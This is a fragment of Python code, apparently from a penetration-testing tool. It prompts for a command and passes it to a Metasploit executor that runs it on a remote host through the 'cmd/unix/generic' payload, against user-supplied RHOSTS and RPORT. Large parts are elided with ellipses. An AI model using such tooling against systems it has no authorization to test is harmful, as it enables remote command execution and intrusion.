...
async def main():
    ...
    console.print(f"[bold yellow]  Parameter: CMD[/]")
    console.print(f"  Description: ")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for CMD [default: {default_val}]: [/]"
    ) or default_val

    if not user_input and True:
        raise ValueError("Missing required parameter: CMD")
    user_params["CMD"] = user_input
    ...
    with console.status("[bold green]Configuring Metasploit payload..."):
        ...
        metasploit_executor.exploit_and_execute_payload(
            ...
            payload_module_name="cmd/unix/generic",
            RHOSTS=user_params["RHOSTS"], RPORT=user_params["RPORT"], CMD=user_params["CMD"]
    )
